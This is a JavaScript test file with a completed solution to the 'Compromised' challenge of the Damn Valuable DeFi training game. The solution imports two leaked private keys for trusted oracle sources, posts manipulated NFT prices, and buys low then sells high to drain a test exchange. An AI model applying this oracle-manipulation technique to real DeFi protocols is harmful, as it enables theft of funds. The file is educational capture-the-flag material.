const { ether, balance, BN } = require('@openzeppelin/test-helpers');
const { accounts, contract, web3 } = require('@openzeppelin/test-environment');

const Exchange = contract.fromArtifact('Exchange');
const DamnValuableNFT = contract.fromArtifact('DamnValuableNFT');
const TrustfulOracle = contract.fromArtifact('TrustfulOracle');
const TrustfulOracleInitializer = contract.fromArtifact('TrustfulOracleInitializer');

const { expect } = require('chai');

describe('Compromised challenge', function () {

    const sources = [
        '0xA73209FB1a42495120166736362A1DfA9F95A105',
        '0xe92401A4d3af5E446d93D11EEc806b1462b39D15',
        '0x81A5D6E50C214044bE44cA0CB057fe119097850c'
    ];

    const [deployer, attacker] = accounts;
    const EXCHANGE_INITIAL_ETH_BALANCE = ether('10000');
    const INITIAL_NFT_PRICE = ether('999');

    before(async function () {
        /** SETUP - NO NEED TO CHANGE ANYTHING HERE */

        // Fund the trusted source addresses
        await web3.eth.sendTransaction({ from: deployer, to: sources[0], value: ether('5') });
        await web3.eth.sendTransaction({ from: deployer, to: sources[1], value: ether('5') });
        await web3.eth.sendTransaction({ from: deployer, to: sources[2], value: ether('5') });

        // Deploy the oracle and setup the trusted sources with initial prices
        this.oracle = await TrustfulOracle.at(
            await (await TrustfulOracleInitializer.new(
                sources,
                ["DVNFT", "DVNFT", "DVNFT"],
                [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE],
                { from: deployer }
            )).oracle()
        );

        // Deploy the exchange and get the associated ERC721 token
        this.exchange = await Exchange.new(
            this.oracle.address,
            { from: deployer, value: EXCHANGE_INITIAL_ETH_BALANCE }
        );
        this.token = await DamnValuableNFT.at(await this.exchange.token());

        // Keep track of attacker's initial ETH balance
        this.initialAttackerbalance = await balance.current(attacker);
    });

    it('Exploit', async function () {
        /** YOUR EXPLOIT GOES HERE */
        
        // online hex decode then base64 decode the string from the server and I got what looked like private keys
        // there's a 0x within the string therefore a `split('0x')` will give private keys
        const leakedAccounts = '0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a90x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48'
            .split('0x').filter(x => !!x)
            .map(x => (web3.eth.accounts.privateKeyToAccount(`0x${x}`)))
        expect(leakedAccounts.length).eq(2);

        // have priv keys for the last 2 sources
        expect(leakedAccounts[0].address).to.eq(sources[1], 'Found leaked private key is in sources');
        expect(leakedAccounts[1].address).to.eq(sources[2], 'Found leaked private key is in sources');

        const encodedABI = this.oracle.contract.methods.postPrice(web3.utils.asciiToHex('DVNFT'), 0).encodeABI();
        for (let i = 0; i < 2; i++) {
            // import the new accounts so can be used by web3 to sign transactions
            await web3.eth.personal.importRawKey(leakedAccounts[i].privateKey, '');
            web3.eth.personal.unlockAccount(leakedAccounts[i].address, '', 999999);
            // lower the price to 0 per token
            await this.oracle.postPrice('DVNFT', new BN('0'), { from: leakedAccounts[i].address });
        }
        const latestPrice = (await this.oracle.getMedianPrice('DVNFT')).toString();
        expect(latestPrice).to.eq('0', 'latest price is 0');
        
        // buy tokens
        const tokenIdReceipt = await this.exchange.buyOne({ from: attacker, value: ether('1') });
        const tokenId = parseInt(tokenIdReceipt.receipt.logs[0].args.tokenId);
        expect(tokenId).to.gte(1, 'got a valid token id');

        // raise back the price to 10k eth per token (max of exchange's balance)
        for (let i = 0; i < 2; i++) {
            await this.oracle.postPrice('DVNFT', ether('10000'), { from: leakedAccounts[i].address });
        }
        expect((await this.oracle.getMedianPrice('DVNFT')).toString()).to.eq(ether('10000').toString());
        await this.token.approve(this.exchange.address, tokenId, { from: attacker });
        await this.exchange.sellOne(tokenId, { from: attacker });
    });

    after(async function () {
        // Exchange must have lost all ETH
        expect(
            await balance.current(this.exchange.address)
        ).to.be.bignumber.eq('0');
    });
});


